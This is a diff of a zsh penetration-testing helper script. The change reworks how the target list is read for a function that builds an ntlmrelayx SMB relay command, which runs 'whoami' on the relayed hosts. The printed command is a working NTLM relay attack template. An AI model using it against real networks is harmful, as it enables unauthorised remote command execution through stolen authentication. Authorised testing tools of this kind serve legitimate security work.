@@ -49,9 +49,9 @@ nb-ad-smb-relay-ntlmrelay-shell() {
 
 nb-ad-smb-relay-ntlmrelay-command() {
 	__ask "Enter a targets list file"
-	__check-targets
+	local targets && __askvar targets TARGETS
 
-	print -z "sudo ntlmrelayx.py -tf ${__TARGETS} -smb2support -c 'whoami'"
+	print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami'"
 }
 
 nb-ad-smb-relay-multirelay-command() {
